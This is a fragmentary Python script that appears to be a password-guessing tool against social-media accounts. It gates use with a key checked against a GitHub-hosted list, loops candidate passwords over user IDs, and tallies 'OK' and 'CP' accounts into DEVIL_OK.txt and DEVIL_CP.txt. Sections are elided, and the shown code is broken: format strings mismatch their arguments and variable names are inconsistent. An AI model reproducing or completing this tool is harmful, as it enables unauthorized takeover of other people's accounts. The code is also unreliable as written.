...
a=requests.get("https://github.com/DEVIL-NAJMUL/fi/blob/main/appru.txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;92m Total OK : \x1b[1;91m %s  \x1b[1;92mDEVIL_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;91m Total CP :\x1b[1;91m   %s \x1b[1;91mDEVIL_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;93mPress enter to back DEVIL Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;93m[DEVIL-CHECK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
